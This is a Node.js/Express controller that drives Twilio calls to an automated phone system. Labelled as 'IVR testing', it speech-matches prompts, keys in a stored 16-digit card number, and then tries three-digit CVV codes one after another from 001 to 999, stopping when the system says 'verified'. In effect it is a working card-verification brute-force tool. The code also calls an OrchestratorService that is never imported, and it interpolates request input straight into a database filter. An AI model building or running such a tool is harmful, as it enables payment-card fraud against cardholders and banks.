import twilio from 'twilio';
import * as AttemptModel from '../models/attemptModel.js';
import * as transcriptionService from '../services/transcriptionService.js';
import { supabase } from '../config/db.js';

import fs from 'fs';
import path, { dirname } from 'path';
import { fileURLToPath } from 'url';
import https from 'https';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const AUDIO_DIR = path.join(__dirname, '../../audio_files');

// Host resolver for Twilio webhooks (handles Render, custom domains, and local fallback)
const resolveHostUrl = (req) => {
  if (process.env.SERVER_URL && process.env.SERVER_URL.trim()) {
    let u = process.env.SERVER_URL.trim();
    if (!u.startsWith('http://') && !u.startsWith('https://')) u = `https://${u}`;
    return u.replace(/\/+$/, '');
  }
  if (process.env.RENDER_EXTERNAL_URL && process.env.RENDER_EXTERNAL_URL.trim()) {
    let u = process.env.RENDER_EXTERNAL_URL.trim();
    if (!u.startsWith('http://') && !u.startsWith('https://')) u = `https://${u}`;
    return u.replace(/\/+$/, '');
  }
  if (process.env.RENDER_EXTERNAL_HOSTNAME && process.env.RENDER_EXTERNAL_HOSTNAME.trim()) {
    return `https://${process.env.RENDER_EXTERNAL_HOSTNAME.trim()}`.replace(/\/+$/, '');
  }
  if (req) {
    const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https' || req.protocol === 'https';
    const proto = isHttps ? 'https' : (req.protocol || 'http');
    const host = req.get('host');
    return `${proto}://${host}`.replace(/\/+$/, '');
  }
  return 'http://localhost:5000';
};

// Generate TwiML for when the call is answered (Outbound Automated QA Flow)
export const getTwiML = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    if (fetchErr || !attempt) {
      throw new Error(`Attempt #${attemptId} not found.`);
    }

    const twiml = new twilio.twiml.VoiceResponse();
    const host = resolveHostUrl(req);

    await AttemptModel.addLog(attemptId, 'Call connected. Listening to IVR speech instructions...');
    await AttemptModel.updateAttemptStatus(attemptId, 'CONNECTED');

    // Twilio speech recognition gather to listen to what IVR is saying
    const gather = twiml.gather({
      input: 'speech',
      action: `${host}/api/call/listen/${attemptId}`,
      method: 'POST',
      timeout: 6,
      speechTimeout: 'auto',
      speechModel: 'phone_call'
    });

    gather.pause({ length: 5 });

    // Fallback redirect back to listen if gather completes without speech
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (error) {
    console.error('Error generating TwiML:', error);
    const twiml = new twilio.twiml.VoiceResponse();
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for handling Twilio Speech-to-Text and dynamic IVR dialogue responses
export const handleInteractiveListen = async (req, res) => {
  const { attemptId } = req.params;
  const { SpeechResult } = req.body;
  const twiml = new twilio.twiml.VoiceResponse();
  const host = resolveHostUrl(req);

  try {
    const { data: attempt } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    if (!attempt) {
      twiml.hangup();
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    const card = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
    const currentCode = attempt.current_test_code || (attempt.test_value && attempt.test_value.includes(':') ? attempt.test_value.split(':')[1] : '001');
    const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : null;

    const speech = (SpeechResult || '').toLowerCase().trim();

    if (SpeechResult) {
      await AttemptModel.addLog(attemptId, `IVR: "${SpeechResult}"`);
    }

    // CASE 1: IVR requests 16-Digit Card / Account Number
    if (speech.includes('card number') || speech.includes('16 digit') || speech.includes('card') || speech.includes('account number') || speech.includes('enter or save your card') || speech.includes('enter or say your card')) {
      await AttemptModel.addLog(attemptId, `User (DTMF): ${card}`);
      await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');
      
      twiml.pause({ length: 1 });
      twiml.play({ digits: `ww${card}` });

      const gather = twiml.gather({
        input: 'speech',
        action: `${host}/api/call/listen/${attemptId}`,
        method: 'POST',
        timeout: 6,
        speechTimeout: 'auto',
        speechModel: 'phone_call'
      });
      gather.pause({ length: 5 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // CASE 2: IVR requests 3-Digit Code / Security Code / CVV
    if (speech.includes('three digit') || speech.includes('3 digit') || speech.includes('security code') || speech.includes('cvv') || speech.includes('test code') || speech.includes('verification code')) {
      await AttemptModel.addLog(attemptId, `User (DTMF): ${currentCode}`);
      await AttemptModel.updateAttemptStatus(attemptId, 'TESTING_3_DIGIT');

      twiml.pause({ length: 1 });
      twiml.play({ digits: `ww${currentCode}` });

      const gather = twiml.gather({
        input: 'speech',
        action: `${host}/api/call/listen/${attemptId}`,
        method: 'POST',
        timeout: 6,
        speechTimeout: 'auto',
        speechModel: 'phone_call'
      });
      gather.pause({ length: 5 });
      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // CASE 3: IVR confirms Verification / Success
    if (speech.includes('verification successful') || speech.includes('verified') || speech.includes('details are verified') || speech.includes('thank you, your') || speech.includes('code correct') || (targetCode && currentCode === targetCode)) {
      await AttemptModel.addLog(attemptId, `Code ${currentCode} MATCHED`);
      await AttemptModel.addLog(attemptId, `Verification successful. Call completed.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
        matched_code: currentCode,
        winner: currentCode,
        verified: true,
        end_time: new Date().toISOString()
      });
      OrchestratorService.stopCampaign();
      twiml.pause({ length: 2 });
      twiml.hangup();

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // CASE 4: IVR Rejection / Incorrect code / Cannot validate
    if (speech.includes('incorrect') || speech.includes('invalid') || speech.includes('cannot validate') || speech.includes('not received') || speech.includes('we cannot process') || speech.includes('call us back')) {
      await AttemptModel.addLog(attemptId, `Code ${currentCode} not matched`);
      await AttemptModel.addLog(attemptId, `IVR rejected code ${currentCode}. Call ending.`);
      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
        error: `IVR rejected code ${currentCode}`
      });
      twiml.pause({ length: 1 });
      twiml.hangup();

      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // CASE 5: General intro or continue listening
    const gather = twiml.gather({
      input: 'speech',
      action: `${host}/api/call/listen/${attemptId}`,
      method: 'POST',
      timeout: 6,
      speechTimeout: 'auto',
      speechModel: 'phone_call'
    });
    gather.pause({ length: 5 });
    twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);

    res.type('text/xml');
    return res.send(twiml.toString());
  } catch (err) {
    console.error('Error in handleInteractiveListen:', err);
    twiml.hangup();
    res.type('text/xml');
    return res.send(twiml.toString());
  }
};

// Webhook for tracking call status updates from Twilio and triggering next sequential attempt
export const handleStatusCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { CallStatus, CallDuration } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Status Callback: ${CallStatus}`);

    const { data: attempt } = await supabase
      .from('attempts')
      .select('*')
      .eq('id', attemptId)
      .single();

    const isVerified = attempt && (attempt.status === 'VERIFIED' || attempt.matched_code || attempt.result_details?.winner);

    if (CallStatus === 'completed') {
      const duration = parseInt(CallDuration) || 0;
      if (isVerified) {
        await AttemptModel.addLog(attemptId, 'Call ended: VERIFIED');
        await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', duration, { twilioStatus: CallStatus, end_time: new Date().toISOString() });
      } else {
        await AttemptModel.addLog(attemptId, 'Call ended. Moving to next attempt.');
        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without match' });
      }
    } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
      const duration = parseInt(CallDuration) || 0;
      await AttemptModel.addLog(attemptId, `Call ended with status: ${CallStatus}`);
      await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call ended with status: ${CallStatus}` });
    }

    // If campaign is running and this attempt is NOT verified, queue the next sequential call for 002, 003, etc.!
    if (OrchestratorService.isRunning() && !isVerified && attempt) {
      const currentCodeNum = parseInt(attempt.current_test_code || '001', 10);
      const nextCodeNum = currentCodeNum + 1;
      if (nextCodeNum <= 999) {
        const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
        const cardVal = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
        
        await AttemptModel.createAttemptBatch([{
          sixteen_digit: cardVal,
          masked_test_number: AttemptModel.maskTestNumber(cardVal),
          test_value: `${cardVal}:${nextCodeStr}`,
          target_test_code: attempt.target_test_code,
          current_test_code: nextCodeStr,
          phone_number: attempt.destination_number || attempt.target_phone_number,
          from_number: attempt.from_number,
          status: 'QUEUED'
        }], attempt.batch_id || `IVR_TEST_${Date.now()}`);

        console.log(`[Orchestrator] Next sequential attempt queued for code ${nextCodeStr}`);
      } else {
        console.log(`[Orchestrator] Exhausted all 999 codes. Halting campaign.`);
        OrchestratorService.stopCampaign();
      }
    }

    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling status callback:', error);
    return res.status(500).send('Error');
  }
};

// Webhook for handling recording callbacks
export const handleRecordingCallback = async (req, res) => {
  const { attemptId } = req.params;
  const { RecordingSid, RecordingUrl, RecordingStatus, RecordingDuration } = req.body;
  try {
    await AttemptModel.addLog(attemptId, `Twilio Recording Callback status: ${RecordingStatus}`);

    if (RecordingUrl) {
      await AttemptModel.addLog(attemptId, `Recording URL available: ${RecordingUrl}`);

      const { data: updatedAttempt } = await supabase
        .from('attempts')
        .update({
          recording_sid: RecordingSid,
          recording_status: RecordingStatus,
          recording_url: RecordingUrl,
          updated_at: new Date().toISOString()
        })
        .eq('id', attemptId)
        .select()
        .single();

      if (updatedAttempt) {
        const { broadcast } = await import('../services/websocketService.js');
        broadcast('attempt_update', updatedAttempt);
      }

      // Start transcription & download recording asynchronously
      transcriptionService.processRecording(attemptId, RecordingUrl).catch(err => {
        console.error(`Error processing recording for attempt #${attemptId}:`, err);
      });
    }
    return res.status(200).send('OK');
  } catch (error) {
    console.error('Error handling recording callback:', error);
    return res.status(500).send('Error');
  }
};

// Secure recording audio stream proxy endpoint
export const streamRecordingAudio = async (req, res) => {
  const { attemptId } = req.params;
  try {
    const localFilePath = path.join(AUDIO_DIR, `attempt_${attemptId}.mp3`);

    if (fs.existsSync(localFilePath)) {
      res.setHeader('Content-Type', 'audio/mpeg');
      return fs.createReadStream(localFilePath).pipe(res);
    }

    const attemptIdNum = parseInt(attemptId, 10);
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('recording_url, result_details, attempt_id')
      .or(`id.eq.${isNaN(attemptIdNum) ? 0 : attemptIdNum},attempt_id.eq.${attemptId}`)
      .maybeSingle();

    let recUrl = attempt?.recording_url || attempt?.result_details?.recording_url || attempt?.result_details?.recordingUrl;

    if (!recUrl) {
      console.warn(`[AudioProxy] No recording_url found in DB for attempt #${attemptId}`);
      return res.status(404).send('Recording audio not found yet. Please wait for Twilio callback.');
    }

    if (!recUrl.endsWith('.mp3') && !recUrl.endsWith('.wav')) {
      recUrl += '.mp3';
    }

    const accountSid = process.env.TWILIO_ACCOUNT_SID;
    const authToken = process.env.TWILIO_AUTH_TOKEN;
    const auth = Buffer.from(`${accountSid}:${authToken}`).toString('base64');

    const options = {
      headers: {
        'Authorization': `Basic ${auth}`
      }
    };

    https.get(recUrl, options, (twilioRes) => {
      if (twilioRes.statusCode === 302) {
        https.get(twilioRes.headers.location, (s3Res) => {
          res.setHeader('Content-Type', 'audio/mpeg');
          s3Res.pipe(res);
        }).on('error', () => res.status(500).send('Error streaming recording from storage.'));
      } else if (twilioRes.statusCode === 200) {
        res.setHeader('Content-Type', 'audio/mpeg');
        twilioRes.pipe(res);
      } else {
        res.status(twilioRes.statusCode).send('Failed to fetch recording from Twilio.');
      }
    }).on('error', () => res.status(500).send('Audio proxy connection error.'));

  } catch (err) {
    console.error('Error in streamRecordingAudio:', err);
    res.status(500).send('Internal server error.');
  }
};

// Interactive live DTMF input handler for Modal Keypad
export const handleInteractiveDtmf = async (req, res) => {
  const { attemptId } = req.params;
  const { digits, step } = req.body;

  try {
    const attemptIdNum = parseInt(attemptId, 10);
    const { data: attempt, error: fetchErr } = await supabase
      .from('attempts')
      .select('*')
      .or(`id.eq.${isNaN(attemptIdNum) ? 0 : attemptIdNum},attempt_id.eq.${attemptId}`)
      .maybeSingle();

    if (fetchErr || !attempt) {
      return res.status(404).json({ error: `Attempt #${attemptId} not found.` });
    }

    const cleanInput = (digits || '').toString().trim().replace(/\D/g, '');

    if (step === 'card') {
      const expectedCard = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '');

      if (cleanInput.length === 16 && (!expectedCard || cleanInput === expectedCard)) {
        await AttemptModel.addLog(attempt.id, `16-digit test value accepted: ${cleanInput}`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'WAITING_FOR_TEST_CODE');

        return res.status(200).json({
          success: true,
          nextStep: 'code',
          message: 'Test value accepted. Please enter your 3 digit test code (CVV).'
        });
      } else {
        await AttemptModel.addLog(attempt.id, `16-digit test value rejected: ${cleanInput}`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'VALIDATING_16_DIGIT');

        return res.status(400).json({
          success: false,
          nextStep: 'card',
          error: 'Invalid 16-digit test value. Please enter a valid 16-digit test number.'
        });
      }
    } else if (step === 'code') {
      const targetCode = attempt.target_test_code ? String(attempt.target_test_code).padStart(3, '0') : '347';
      const formattedInput = cleanInput.padStart(3, '0');

      await AttemptModel.addLog(attempt.id, `Testing code: ${formattedInput}`);
      await AttemptModel.updateCurrentTestCode(attempt.id, formattedInput, 'TESTING_3_DIGIT');

      if (formattedInput === targetCode) {
        await AttemptModel.addLog(attempt.id, `Code ${formattedInput} MATCHED`);
        await AttemptModel.addLog(attempt.id, `Test completed successfully`);
        await AttemptModel.addLog(attempt.id, `Call ended`);

        await supabase.from('attempts').update({
          status: 'VERIFIED',
          matched_code: formattedInput,
          end_time: new Date().toISOString()
        }).eq('id', attempt.id);

        await AttemptModel.updateAttemptStatus(attempt.id, 'VERIFIED', 0, {
          matched_code: formattedInput,
          winner: formattedInput,
          verified: true,
          end_time: new Date().toISOString()
        });

        return res.status(200).json({
          success: true,
          verified: true,
          matchedCode: formattedInput,
          message: 'Test code correct! Details verified. Call completed successfully.'
        });
      } else {
        await AttemptModel.addLog(attempt.id, `Code ${formattedInput} not matched. Try again.`);
        await AttemptModel.updateAttemptStatus(attempt.id, 'TESTING_3_DIGIT');

        return res.status(400).json({
          success: false,
          retry: true,
          nextStep: 'code',
          error: `Incorrect test code ${formattedInput}. Please enter your 3 digit test code (CVV) again.`
        });
      }
    } else {
      return res.status(400).json({ error: 'Invalid step' });
    }
  } catch (err) {
    console.error('Error in handleInteractiveDtmf:', err);
    return res.status(500).json({ error: err.message });
  }
};
